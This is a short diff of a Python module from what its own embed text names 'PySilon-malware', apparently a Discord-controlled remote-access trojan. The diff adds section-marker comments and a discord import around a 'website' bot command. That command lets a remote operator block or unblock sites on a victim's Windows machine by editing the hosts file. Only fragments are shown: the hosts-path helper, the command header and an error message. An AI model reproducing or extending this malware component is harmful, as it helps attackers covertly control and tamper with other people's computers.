@@ -1,6 +1,10 @@
+#<imports>
+import discord
 import ctypes
 from urllib.parse import urlparse
+#</imports>
 
+#<function>
 def get_hosts_file_path():
     hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'
 
@@ -8,7 +12,9 @@ def get_hosts_file_path():
         return hosts_file_path
 
     return None
+#</function>
 
+#<command>
 @client.command(name="website")
 async def website_blocker(ctx, option=None, website=None):
     await ctx.message.delete()
@@ -67,3 +73,4 @@ async def website_blocker(ctx, option=None, website=None):
         embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website <block/unblock> <https://example.com>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+#</command>
